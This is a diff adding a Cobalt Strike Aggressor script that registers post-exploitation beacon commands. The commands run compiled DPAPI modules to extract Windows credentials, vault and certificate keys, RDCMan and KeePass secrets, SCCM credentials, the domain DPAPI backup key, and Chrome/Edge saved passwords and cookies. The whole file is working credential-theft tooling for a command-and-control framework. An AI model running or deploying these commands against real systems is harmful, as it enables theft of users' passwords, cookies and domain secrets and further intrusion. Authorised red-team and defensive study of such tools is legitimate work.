@@ -1,0 +1,445 @@
+#
+# SharpDPAPI BOF — Cobalt Strike Aggressor Script
+# Registers all DPAPI BOF commands and handles argument packing.
+#
+
+# ---- Utility: locate BOF directory ----
+$bof_dir = script_resource("dist");
+
+sub _load_bof {
+    local('$bof_path $handle $data');
+    $bof_path = $bof_dir . "/" . $1 . ".o";
+    $handle = openf($bof_path);
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+# ---- Helper: parse /key:value args ----
+sub _parse_args {
+    local('%result @parts $arg $key $val $idx');
+    %result = %();
+    @parts = split(' ', $1);
+    foreach $arg (@parts) {
+        if ($arg ismatch '/(.+?):(.+)') {
+            ($key, $val) = matched();
+            %result[$key] = $val;
+        } else if ($arg eq "/unprotect") {
+            %result["unprotect"] = "1";
+        } else if ($arg eq "/rpc") {
+            %result["rpc"] = "1";
+        } else if ($arg eq "/hashes") {
+            %result["hashes"] = "1";
+        } else if ($arg eq "/showall") {
+            %result["showall"] = "1";
+        } else if ($arg eq "/machine") {
+            %result["machine"] = "1";
+        } else if ($arg eq "/nowrap") {
+            %result["nowrap"] = "1";
+        }
+    }
+    return %result;
+}
+
+sub _str_or_empty {
+    if ($1 is $null || $1 eq "") { return ""; }
+    return $1;
+}
+
+# ============================================================
+# masterkeys
+# ============================================================
+alias masterkeys {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 11));
+
+    $data = _load_bof("masterkeys");
+    $args = bof_pack($bid, "zzzzzzii",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["server"]),
+        iff(%args["rpc"] eq "1", 1, 0),
+        iff(%args["hashes"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "masterkeys",
+    "Triage user DPAPI masterkeys",
+    "Usage: masterkeys [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/rpc] [/hashes]"
+);
+
+# ============================================================
+# credentials
+# ============================================================
+alias credentials {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 12));
+
+    $data = _load_bof("credentials");
+    $args = bof_pack($bid, "zzzzzz",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["server"])
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "credentials",
+    "Triage user DPAPI credential files",
+    "Usage: credentials [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC]"
+);
+
+# ============================================================
+# vaults
+# ============================================================
+alias vaults {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 7));
+
+    $data = _load_bof("vaults");
+    $args = bof_pack($bid, "zzzzzz",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["server"])
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "vaults",
+    "Triage user DPAPI vault files",
+    "Usage: vaults [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC]"
+);
+
+# ============================================================
+# blob
+# ============================================================
+alias blob {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 5));
+
+    $data = _load_bof("blob");
+    $args = bof_pack($bid, "zzi",
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["credkey"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "blob",
+    "Describe/decrypt a raw DPAPI blob",
+    "Usage: blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]"
+);
+
+# ============================================================
+# backupkey
+# ============================================================
+alias backupkey {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 10));
+
+    $data = _load_bof("backupkey");
+    $args = bof_pack($bid, "zi",
+        _str_or_empty(%args["server"]),
+        iff(%args["nowrap"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "backupkey",
+    "Retrieve domain DPAPI backup key from DC",
+    "Usage: backupkey [/server:DC] [/nowrap]"
+);
+
+# ============================================================
+# certificates
+# ============================================================
+alias certificates {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 13));
+
+    $data = _load_bof("certificates");
+    $args = bof_pack($bid, "zzzzzzii",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["server"]),
+        iff(%args["showall"] eq "1", 1, 0),
+        iff(%args["machine"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "certificates",
+    "Triage DPAPI certificate private keys",
+    "Usage: certificates [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/showall] [/machine]"
+);
+
+# ============================================================
+# rdg
+# ============================================================
+alias rdg {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 4));
+
+    $data = _load_bof("rdg");
+    $args = bof_pack($bid, "zzzzzzi",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["server"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "rdg",
+    "Triage RDG/RDCMan saved credentials",
+    "Usage: rdg [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/unprotect]"
+);
+
+# ============================================================
+# keepass
+# ============================================================
+alias keepass {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 7));
+
+    $data = _load_bof("keepass");
+    $args = bof_pack($bid, "zzzzzi",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["target"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "keepass",
+    "Triage KeePass master key files",
+    "Usage: keepass [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/unprotect]"
+);
+
+# ============================================================
+# ps (PSCredential)
+# ============================================================
+alias ps {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 3));
+
+    $data = _load_bof("ps");
+    $args = bof_pack($bid, "zzzi",
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["credkey"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "ps",
+    "Decrypt PowerShell PSCredential / SecureString files",
+    "Usage: ps /target:FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect]"
+);
+
+# ============================================================
+# Machine BOFs (no args)
+# ============================================================
+alias machinemasterkeys {
+    beacon_inline_execute($1, _load_bof("machinemasterkeys"), "go", $null);
+}
+beacon_command_register("machinemasterkeys", "Triage SYSTEM DPAPI masterkeys (requires admin)", "Usage: machinemasterkeys");
+
+alias machinecredentials {
+    beacon_inline_execute($1, _load_bof("machinecredentials"), "go", $null);
+}
+beacon_command_register("machinecredentials", "Triage SYSTEM credential files (requires admin)", "Usage: machinecredentials");
+
+alias machinevaults {
+    beacon_inline_execute($1, _load_bof("machinevaults"), "go", $null);
+}
+beacon_command_register("machinevaults", "Triage SYSTEM vault files (requires admin)", "Usage: machinevaults");
+
+alias machinetriage {
+    beacon_inline_execute($1, _load_bof("machinetriage"), "go", $null);
+}
+beacon_command_register("machinetriage", "Full SYSTEM DPAPI triage (creds+vaults+certs, requires admin)", "Usage: machinetriage");
+
+# ============================================================
+# triage (full user)
+# ============================================================
+alias triage {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 7));
+
+    $data = _load_bof("triage_bof");
+    $args = bof_pack($bid, "zzzzzi",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["password"]),
+        _str_or_empty(%args["ntlm"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["server"]),
+        iff(%args["showall"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "triage",
+    "Full user DPAPI triage (masterkeys + creds + vaults + certs)",
+    "Usage: triage [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/server:DC] [/showall]"
+);
+
+# ============================================================
+# search
+# ============================================================
+alias search {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 7));
+
+    $data = _load_bof("search");
+    $args = bof_pack($bid, "zzzzz",
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["server"]),
+        _str_or_empty(%args["pattern"]),
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["credkey"])
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "search",
+    "Search for files containing DPAPI blobs",
+    "Usage: search [/target:PATH] [/server:DC] [/pattern:REGEX] [/pvk:BASE64] [/credkey:KEY]"
+);
+
+# ============================================================
+# sccm
+# ============================================================
+alias sccm {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 5));
+
+    $data = _load_bof("sccm");
+    $args = bof_pack($bid, "z",
+        _str_or_empty(%args["target"])
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "sccm",
+    "Triage SCCM NAA/task sequence credentials (requires admin)",
+    "Usage: sccm [/target:PATH]"
+);
+
+# ============================================================
+# Chrome BOFs
+# ============================================================
+alias chrome_logins {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 14));
+
+    $data = _load_bof("chrome_logins");
+    $args = bof_pack($bid, "zzzzzi",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["server"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["statekey"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "chrome_logins",
+    "Extract Chrome/Edge saved passwords",
+    "Usage: chrome_logins [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/statekey:HEX] [/unprotect]"
+);
+
+alias chrome_cookies {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 15));
+
+    $data = _load_bof("chrome_cookies");
+    $args = bof_pack($bid, "zzzzzzzi",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["server"]),
+        _str_or_empty(%args["target"]),
+        _str_or_empty(%args["statekey"]),
+        _str_or_empty(%args["cookie"]),
+        _str_or_empty(%args["url"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "chrome_cookies",
+    "Extract Chrome/Edge cookies",
+    "Usage: chrome_cookies [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/statekey:HEX] [/cookie:REGEX] [/url:REGEX] [/unprotect]"
+);
+
+alias chrome_statekeys {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 17));
+
+    $data = _load_bof("chrome_statekeys");
+    $args = bof_pack($bid, "zzzzi",
+        _str_or_empty(%args["pvk"]),
+        _str_or_empty(%args["credkey"]),
+        _str_or_empty(%args["server"]),
+        _str_or_empty(%args["target"]),
+        iff(%args["unprotect"] eq "1", 1, 0)
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "chrome_statekeys",
+    "Extract Chrome/Edge Local State AES keys",
+    "Usage: chrome_statekeys [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/unprotect]"
+);
